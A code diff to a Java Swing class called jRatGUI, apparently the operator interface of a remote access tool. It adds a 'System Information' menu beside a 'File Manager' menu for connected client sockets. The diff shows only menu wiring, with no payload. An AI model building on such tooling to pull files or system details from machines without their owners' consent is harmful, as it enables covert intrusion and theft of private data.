@@ -1,15 +1,15 @@
 package Server.ServerGUI;
 
 import Server.ServerConnections.Server;
-import Server.ServerGUI.TableUtils.BrowserMenuListener;
-import Server.ServerGUI.TableUtils.StateColumnRenderer;
-import Server.ServerGUI.TableUtils.TableModel;
-import Server.ServerGUI.TableUtils.TablePopUpListener;
+import Server.ServerConnections.Streams;
+import Server.ServerGUI.TableUtils.*;
 import com.formdev.flatlaf.FlatDarkLaf;
 
 import javax.swing.*;
 import javax.swing.table.DefaultTableCellRenderer;
 import java.awt.*;
+import java.net.Socket;
+import java.util.concurrent.ConcurrentHashMap;
 
 
 public class jRatGUI {
@@ -19,7 +19,7 @@ public class jRatGUI {
     private JTable connectionTable;
     private JFrame frame;
     private JPopupMenu popupMenu;
-    private Server server;
+    private final Server server;
 
 
     public jRatGUI(Server server) {
@@ -76,13 +76,15 @@ public class jRatGUI {
     }
 
     private JMenu browserMenu;
+    private JMenuItem sysInfoMenu;
 
     private void addPopUpMenu(){
         popupMenu = new JPopupMenu();
-
         browserMenu = new JMenu("File Manager");
+        sysInfoMenu = new JMenuItem("System Information");
 
         popupMenu.add(browserMenu);
+        popupMenu.add(sysInfoMenu);
 
     }
 
@@ -94,8 +96,11 @@ public class jRatGUI {
         tableScroll.setBounds(0, 0, 784, 780);
         connectionTable.setComponentPopupMenu(popupMenu);
 
+
+        ConcurrentHashMap<Socket, Streams> map = server.getMap();
         connectionTable.addMouseListener(new TablePopUpListener(connectionTable));
-        browserMenu.addMenuListener(new BrowserMenuListener(connectionTable,browserMenu,server));
+        browserMenu.addMenuListener(new BrowserMenuListener(connectionTable,browserMenu,map));
+        sysInfoMenu.addActionListener(new SystemInformationListener(connectionTable,map));
 
         panel.add(tableScroll);
         frame.add(panel);
